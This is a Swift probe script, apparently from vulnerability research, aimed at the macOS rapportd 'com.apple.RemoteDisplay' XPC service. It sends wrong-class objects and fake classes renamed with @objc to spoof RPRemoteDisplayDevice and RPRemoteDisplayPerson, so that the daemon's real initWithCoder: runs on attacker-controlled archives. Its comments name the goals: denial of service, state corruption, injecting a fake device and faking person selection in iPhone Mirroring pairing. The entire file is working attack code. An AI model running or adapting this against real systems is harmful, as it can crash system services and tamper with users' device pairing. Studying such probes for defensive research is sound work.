// rapportd Non-Nil Argument Probe
// Tests whether rapportd's NSXPCDecoder class whitelist can be bypassed by:
//   1. NSObject  -- expect INTERRUPTED (not in whitelist)
//   2. NSNull    -- might be in whitelist (used for nil in archives)
//   3. NSString  -- expect INTERRUPTED (not in whitelist)
//   4. Fake "RPRemoteDisplayDevice" class -- @objc renamed so NSKeyedArchiver
//      embeds classname="RPRemoteDisplayDevice", which rapportd trusts.
//      rapportd's REAL initWithCoder: runs on our fake archive. If it crashes
//      or misbehaves -> DoS / state corruption finding.
//
// If case 4 gets TIMEOUT (accepted) -> rapportd ran REAL RPRemoteDisplayDevice.initWithCoder:
// on attacker-controlled archive data. Impact: crash, nil-field device injected, or worse.

import Foundation

// Fake class whose @objc name matches rapportd's real class.
// NSKeyedArchiver will embed "$classname = RPRemoteDisplayDevice" in the archive.
// rapportd's NSKeyedUnarchiver resolves this to the REAL RPRemoteDisplayDevice class
// (from dyld cache) and calls its initWithCoder:. We control the archive payload.
@objc(RPRemoteDisplayDevice)
final class FakeRPRemoteDisplayDevice: NSObject, NSSecureCoding {
    static var supportsSecureCoding: Bool { true }

    // Attempt 1: empty archive (all fields nil when real initWithCoder: runs)
    var fakeUUID: String

    init(fakeUUID: String = "DEADBEEF-1234-5678-ABCD-000000000000") {
        self.fakeUUID = fakeUUID
    }

    required init?(coder: NSCoder) {
        fakeUUID = (coder.decodeObject(of: NSString.self, forKey: "fakeUUID") as String?) ?? ""
        super.init()
    }

    func encode(with coder: NSCoder) {
        // Only encode our fake key — real RPRemoteDisplayDevice.initWithCoder:
        // will see nil for all its expected keys
        coder.encode(fakeUUID as NSString, forKey: "fakeUUID")
    }
}

// Same trick for RPRemoteDisplayPerson
@objc(RPRemoteDisplayPerson)
final class FakeRPRemoteDisplayPerson: NSObject, NSSecureCoding {
    static var supportsSecureCoding: Bool { true }
    required init?(coder: NSCoder) { super.init() }
    func encode(with coder: NSCoder) {}
    override init() { super.init() }
}

@objc protocol RPRemoteDisplayDaemonXPC: NSObjectProtocol {
    @objc optional func remoteDisplayChangeDedicatedDevice(_ device: AnyObject?)
    @objc optional func remoteDisplayPersonSelected(_ person: AnyObject?, forDedicatedPairing: Bool)
}

func probe(label: String, waitSeconds: Int = 6,
           action: @escaping (RPRemoteDisplayDaemonXPC, DispatchSemaphore) -> Void) {
    print("\n=== [com.apple.RemoteDisplay] \(label) ===")
    let conn = NSXPCConnection(machServiceName: "com.apple.RemoteDisplay", options: [])
    conn.remoteObjectInterface = NSXPCInterface(with: RPRemoteDisplayDaemonXPC.self)
    var result = "(pending)"
    let sema = DispatchSemaphore(value: 0)
    conn.invalidationHandler = { if result == "(pending)" { result = "INVALIDATED" }; sema.signal() }
    conn.interruptionHandler = { if result == "(pending)" { result = "INTERRUPTED — class not in whitelist" }; sema.signal() }
    conn.resume()
    let proxy = conn.remoteObjectProxyWithErrorHandler { err in
        let e = err as NSError
        result = "ERROR: \(e.localizedDescription)"
        sema.signal()
    } as? RPRemoteDisplayDaemonXPC
    guard let p = proxy else { print("  No proxy"); conn.invalidate(); return }
    action(p, sema)
    if sema.wait(timeout: .now() + .seconds(waitSeconds)) == .timedOut {
        result = "TIMEOUT (\(waitSeconds)s) *** ACCEPTED — class whitelist bypassed or method executed ***"
    }
    print("  RESULT: \(result)")
    conn.invalidate()
    Thread.sleep(forTimeInterval: 2.0)
}

// ---- MAIN ----

print("=== rapportd Non-Nil Argument / Class Whitelist Probe ===")
print("PID: \(ProcessInfo.processInfo.processIdentifier)  UID: \(getuid())\n")

// 1. NSNumber — conforms to NSSecureCoding; NOT in RPRemoteDisplayDevice whitelist.
//    NSObject() was removed — it crashes NSXPCEncoder (no NSSecureCoding conformance).
probe(label: "remoteDisplayChangeDedicatedDevice:(NSNumber 42) — wrong class, NSSecureCoding OK") { p, sema in
    p.remoteDisplayChangeDedicatedDevice?(NSNumber(value: 42))
    DispatchQueue.global().asyncAfter(deadline: .now() + 5) { sema.signal() }
}

// 2. NSNull — sometimes allowed as "nil substitute" in NSXPCInterface whitelists
probe(label: "remoteDisplayChangeDedicatedDevice:(NSNull) — null object test") { p, sema in
    p.remoteDisplayChangeDedicatedDevice?(NSNull())
    DispatchQueue.global().asyncAfter(deadline: .now() + 5) { sema.signal() }
}

// 3. NSString — clearly wrong class, should be INTERRUPTED
probe(label: "remoteDisplayChangeDedicatedDevice:(NSString) — string class test") { p, sema in
    p.remoteDisplayChangeDedicatedDevice?("fakeDevice" as AnyObject)
    DispatchQueue.global().asyncAfter(deadline: .now() + 5) { sema.signal() }
}

// 4. Fake RPRemoteDisplayDevice — class name spoof
// @objc(RPRemoteDisplayDevice) means NSKeyedArchiver writes classname="RPRemoteDisplayDevice"
// rapportd's NSKeyedUnarchiver resolves this to REAL RPRemoteDisplayDevice class
// and calls REAL initWithCoder: with our minimal fake archive.
// If TIMEOUT: rapportd processed our fake device object (DoS/injection risk)
// If INTERRUPTED: class whitelist check caught the spoofed class somehow
probe(label: "remoteDisplayChangeDedicatedDevice:(FAKE RPRemoteDisplayDevice) — class-name spoof",
      waitSeconds: 8) { p, sema in
    let fakeDevice = FakeRPRemoteDisplayDevice(fakeUUID: "ATTACKER-1337-DEAD-BEEF-000000000000")
    print("  Sending fake RPRemoteDisplayDevice object (classname spoof via @objc rename)")
    print("  If rapportd accepts: REAL RPRemoteDisplayDevice.initWithCoder: runs on attacker archive")
    p.remoteDisplayChangeDedicatedDevice?(fakeDevice)
    // No asyncAfter - full 8s wait to detect delayed INTERRUPTED
}

// 5. Fake RPRemoteDisplayPerson for remoteDisplayPersonSelected:
probe(label: "remoteDisplayPersonSelected:(FAKE RPRemoteDisplayPerson) forDedicatedPairing:true",
      waitSeconds: 8) { p, sema in
    let fakePerson = FakeRPRemoteDisplayPerson()
    print("  Sending fake RPRemoteDisplayPerson + forDedicatedPairing:true")
    print("  If accepted: could trigger fake person-selection in iPhone Mirroring pairing UI")
    p.remoteDisplayPersonSelected?(fakePerson, forDedicatedPairing: true)
}

print("\n=== Non-nil probe complete. PID: \(ProcessInfo.processInfo.processIdentifier) ===")
